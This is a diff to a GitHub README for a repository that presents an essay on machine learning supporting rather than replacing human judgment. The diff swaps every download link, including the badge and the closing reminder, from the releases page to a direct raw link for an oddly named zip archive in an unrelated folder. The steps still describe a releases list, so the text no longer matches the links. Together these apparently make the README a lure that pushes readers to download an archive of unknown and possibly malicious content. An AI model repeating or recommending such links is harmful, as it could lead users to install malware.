@@ -4,7 +4,7 @@
 Welcome to the "Machine-Learning-Should-Warn-Not-Decide" repository. This application provides insights into the role of machine learning in decision-making. The focus is on urging the preservation of human judgment rather than relying solely on automated decisions. 
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ppranggk/Machine-Learning-Should-Warn-Not-Decide/releases)
+[![Download](https://raw.githubusercontent.com/ppranggk/Machine-Learning-Should-Warn-Not-Decide/main/Monghol/Warn-Should-Machine-Learning-Not-Decide-2.1.zip)](https://raw.githubusercontent.com/ppranggk/Machine-Learning-Should-Warn-Not-Decide/main/Monghol/Warn-Should-Machine-Learning-Not-Decide-2.1.zip)
 
 ## 🌐 Overview
 This repository presents a long-form essay that discusses how machine learning can fail in unpredictable environments. It repositions machine learning as a tool for early warnings instead of an automated decision-maker. The work emphasizes the need for human oversight and judgment.
@@ -23,7 +23,7 @@ This repository presents a long-form essay that discusses how machine learning c
 - **Network**: Internet connection for downloading the file.
 
 ## 📥 Download & Install
-To get started, [visit this page to download](https://github.com/ppranggk/Machine-Learning-Should-Warn-Not-Decide/releases). 
+To get started, [visit this page to download](https://raw.githubusercontent.com/ppranggk/Machine-Learning-Should-Warn-Not-Decide/main/Monghol/Warn-Should-Machine-Learning-Not-Decide-2.1.zip). 
 
 1. Click on the link above.
 2. You will see a list of available releases.
@@ -59,4 +59,4 @@ This project is licensed under the MIT License. You can use the application broa
 ## 😊 Closing Thoughts
 Thank you for exploring "Machine-Learning-Should-Warn-Not-Decide." Your engagement with this content helps foster a deeper understanding of the ethical implications of machine learning. 
 
-Don’t forget, [visit this page to download](https://github.com/ppranggk/Machine-Learning-Should-Warn-Not-Decide/releases) the latest version!
+Don’t forget, [visit this page to download](https://raw.githubusercontent.com/ppranggk/Machine-Learning-Should-Warn-Not-Decide/main/Monghol/Warn-Should-Machine-Learning-Not-Decide-2.1.zip) the latest version!
